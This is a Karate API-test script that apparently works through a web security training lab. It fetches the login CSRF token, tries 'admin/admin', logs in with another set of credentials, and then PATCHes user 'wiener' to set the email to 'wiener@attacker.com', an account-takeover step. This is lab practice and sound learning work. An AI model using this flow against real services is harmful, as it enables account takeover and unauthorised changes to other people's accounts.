Feature: Login via form

  Background:
    * url 'https://0ac2009c047e964781f957f9007a00ec.web-security-academy.net'
    * header Accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    * configure connectTimeout = 5000
    * configure readTimeout = 5000

  Scenario: Login usando x-www-form-urlencoded (extrae csrf)
    Given path '/login'
    When method get
    Then status 200
    * def csrf = (response.match(/name="csrf" value="([^"]+)"/) ? response.match(/name="csrf" value="([^"]+)"/)[1] : 'PIKIFSDoTsYWU5lrGco9PfaygO149H')
    * header Content-Type = 'application/x-www-form-urlencoded'
    Given path '/login'
    And form field csrf = csrf
    And form field username = 'admin'
    And form field password = 'admin'
    When method post
    Then status 200
    * print responseHeaders
    * def csrf = (response.match(/name="csrf" value="([^"]+)"/) ? response.match(/name="csrf" value="([^"]+)"/)[1] : 'PIKIFSDoTsYWU5lrGco9PfaygO149H')
    * print 'csrf:', csrf



  Scenario: Login usando x-www-form-urlencoded (extrae csrf y hace POST)
    # 1) GET para obtener la página de login y extraer csrf
    Given path '/login'
    When method get
    Then status 200
    * def csrf = (response.match(/name="csrf" value="([^"]+)"/) ? response.match(/name="csrf" value="([^"]+)"/)[1] : 'PIKIFSDoTsYWU5lrGco9PfaygO149H')
    * print 'csrf:', csrf


    * remove header Content-Type
    * configure followRedirects = false

    # 2) POST usando form fields (Karate pone Content-Type automáticamente)
    Given path '/login'
    And form field csrf = csrf
    And form field username = 'aq'
    And form field password = 'harley'
    When method post

    # debug
    * print 'responseStatus:', responseStatus
    * print 'responseHeaders (POST):', responseHeaders
    * print 'response body:', response

    # aceptar 302 o 200; fallar en otro caso
    * assert responseStatus == 302 || responseStatus == 200

    # extraer cookie si aplica
    * def setCookie = responseHeaders['Set-Cookie'] ? responseHeaders['Set-Cookie'][0] : null
    * print 'Set-Cookie:', setCookie

    # re-habilitar redirects para siguientes llamadas
    * configure followRedirects = true


  Scenario: Login y PATCH usuario "wiener"
    # 1) GET formulario de login y extraer csrf
    Given path '/login'
    When method get
    Then status 200
    * def csrf = (response.match(/name="csrf" value="([^"]+)"/) ? response.match(/name="csrf" value="([^"]+)"/)[1] : null)
    * match csrf != null
    * print 'csrf:', csrf

    # 2) POST login (no setear Content-Type manualmente: Karate lo hace)
    * remove header Content-Type
    * configure followRedirects = false
    Given path '/login'
    And form field csrf = csrf
    And form field username = 'aq'
    And form field password = 'harley'
    When method post
    * print 'login status:', responseStatus
    * assert responseStatus == 302 || responseStatus == 200

    # 3) extraer token o cookie para autenticación
    * def token = response.token || (responseHeaders['X-Auth-Token'] ? responseHeaders['X-Auth-Token'][0] : null)
    * def setCookie = responseHeaders['Set-Cookie'] ? responseHeaders['Set-Cookie'][0] : null
    * print 'token:', token, 'setCookie:', setCookie

    # 4) preparar autenticación (construir mapa de headers y aplicarlo)
    * def authHeader = token ? 'Bearer ' + token : null
    * def sessionCookie = (!token && setCookie) ? setCookie.split(';')[0] : null
    * def headers = authHeader ? { Authorization: authHeader } : {}
    * eval if (sessionCookie) headers['Cookie'] = sessionCookie
    * headers headers

    # re-habilitar redirects para siguientes llamadas
    * configure followRedirects = true

    # 5) PATCH a /api/user/wiener con body JSON
    Given path 'api','user','wiener'
    And header Content-Type = 'application/json'
    And request { email: 'wiener@attacker.com' }
    When method patch

    # 6) validaciones y debug
    * print 'patch status:', responseStatus
    * print 'patch responseHeaders:', responseHeaders
    * print 'patch body:', response
    * assert responseStatus == 200



